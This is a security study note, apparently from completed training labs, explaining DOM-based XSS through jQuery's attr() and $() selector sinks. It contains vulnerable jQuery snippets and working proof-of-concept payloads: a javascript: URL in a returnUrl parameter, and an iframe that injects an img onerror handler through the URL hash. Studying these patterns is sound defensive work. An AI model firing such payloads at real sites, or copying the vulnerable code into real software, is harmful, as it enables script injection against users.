# DOM XSS — jQuery Sinks

## Why jQuery is Dangerous

jQuery is a JavaScript library. Some of its functions accept HTML strings and inject them directly into the DOM — making them dangerous sinks when they receive user-controlled input.

---

## Sink 1: `attr()` + `location.search`

### How it works

`attr()` sets an HTML attribute on an element. If the value comes from the URL and is placed in an `href`, an attacker can inject a `javascript:` URL.

**Vulnerable code:**
```javascript
$(function() {
    $('#backLink').attr("href",
        (new URLSearchParams(window.location.search)).get('returnUrl')
    );
});
```

**Data flow:**
```
URL ?returnUrl=...   ← SOURCE
        ↓
.attr("href", ...)   ← SINK
        ↓
<a href="...">Back</a>
```

### Lab: DOM XSS in jQuery href attribute sink

**Level:** Apprentice ✅ Solved

**Attack:**
```
?returnUrl=javascript:alert(document.domain)
```

**Result:**
```html
<a href="javascript:alert(document.domain)">Back</a>
```

When the user clicks "Back" → `alert(document.domain)` executes.

> `javascript:` is a valid URL protocol. When used in `href` and clicked, the browser executes the JS.

---

## Sink 2: `$()` selector + `location.hash`

### How it works

jQuery's `$()` function is normally used to select elements: `$("#myDiv")`. But if the input starts with `<`, jQuery treats it as HTML and **creates new DOM elements** from it.

**Vulnerable code:**
```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

**Data flow:**
```
URL #...             ← SOURCE (location.hash)
        ↓
$(location.hash)     ← SINK ($() creates HTML from string)
        ↓
New element injected into DOM
```

### The problem: how to trigger hashchange without user interaction?

A `hashchange` event fires when the `#` part of the URL changes. Normally a user would have to navigate to a different hash — but an attacker can force it using an `<iframe>`:

```html
<iframe
    src="https://vulnerable-site.com#"
    onload="this.src+='<img src=1 onerror=alert(1)>'"
>
```

**What happens step by step:**
```
1. iframe loads the vulnerable page with empty hash (#)
        ↓
2. onload fires → appends payload to the hash
        ↓
3. hash changes → hashchange event fires
        ↓
4. JS reads location.hash → passes to $()
        ↓
5. jQuery creates <img src=1 onerror=alert(1)>
        ↓
6. onerror fires → alert(1) executes 💥
```

### Lab: DOM XSS in jQuery selector sink using hashchange

**Level:** Apprentice ✅ Solved

**Payload (delivered via iframe):**
```html
<iframe
    src="https://TARGET.com#"
    onload="this.src+='<img src=1 onerror=alert(1)>'"
>
```

---

## Summary

| Sink | Source | Payload Type | Trigger |
|---|---|---|---|
| `attr("href", ...)` | `location.search` | `javascript:alert()` | User clicks link |
| `$()` selector | `location.hash` | `<img onerror=alert()>` | iframe forces hashchange |

---

## Key Takeaways

- jQuery's `$()` creates HTML when input starts with `<` — not just a selector
- `javascript:` URIs in `href` attributes execute when clicked
- `hashchange` attacks often need an external delivery mechanism (iframe)
- Newer jQuery versions patched the `#` prefix issue, but old code is still in the wild
